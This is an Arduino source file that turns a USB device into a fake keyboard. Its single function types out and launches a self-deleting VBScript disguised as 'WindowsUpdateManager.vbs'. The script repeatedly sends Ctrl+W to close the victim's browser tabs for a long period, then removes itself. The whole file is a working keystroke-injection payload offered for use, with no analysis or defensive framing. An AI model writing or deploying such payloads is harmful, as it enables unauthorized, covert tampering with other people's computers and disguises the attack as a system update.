#include<Keyboard.h>
void anti_browser() {
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(800);
  changelanguage();
  Keyboard.print("powershell");
  delay(300);
  typekey(enter);
  delay(800);
  changelanguage();
  Keyboard.print("notepad WindowsUpdateManager.vbs");
  delay(400);
  typekey(enter);
  delay(600);
  typekey(enter);
  changelanguage();
  delay(800);
  Keyboard.print("Set fso = CreateObject(");
  delay(400);
  Keyboard.write('"');
  delay(100);
  Keyboard.print("Scripting.FileSystemObject");
  delay(300);
  Keyboard.write('"');
  delay(100);
  Keyboard.print(")");
  delay(100);
  typekey(enter);
  Keyboard.print("Dim x");
  delay(400);
  typekey(enter);
  Keyboard.print("x = 0");
  delay(400);
  typekey(enter);
  Keyboard.print("WScript.");
  delay(300);
  Keyboard.print("Sleep 300");
  delay(300);
  typekey(enter);
  Keyboard.print("do while x");
  delay(400);
  Keyboard.print(" < 3400");
  delay(400);
  typekey(enter);
  Keyboard.print("Set objShell = CreateObject(");
  delay(300);
  Keyboard.write('"');
  delay(100);
  Keyboard.print("WScript.Shell");
  delay(100);
  Keyboard.write('"');
  delay(100);
  Keyboard.print(')');
  delay(100);
  typekey(enter);
  Keyboard.print("WScript.Sleep 800");
  delay(300);
  typekey(enter);
  Keyboard.print("objShell.SendKeys ");
  delay(300);
  Keyboard.write('"');
  delay(300);
  Keyboard.print("^W");
  delay(200);
  Keyboard.write('"');
  delay(200);
  typekey(enter);
  Keyboard.print("x=x+1");
  delay(300);
  typekey(enter);
  Keyboard.print("loop");
  delay(100);
  typekey(enter);
  Keyboard.print("fso.DeleteFile (");
  delay(300);
  Keyboard.write('"');
  delay(100);
  Keyboard.print("WindowsUpdateManager.vbs");
  delay(300);
  Keyboard.write('"');
  delay(100);
  Keyboard.print(")");
  delay(100);
  altf4();
  delay(600);
  typekey(enter);
  delay(300);
  Keyboard.print("start WindowsUpdateManager.vbs");
  delay(300);
  typekey(enter);
  delay(300);
  Keyboard.print("exit");
  delay(100);
  typekey(enter);
  Keyboard.end();
}
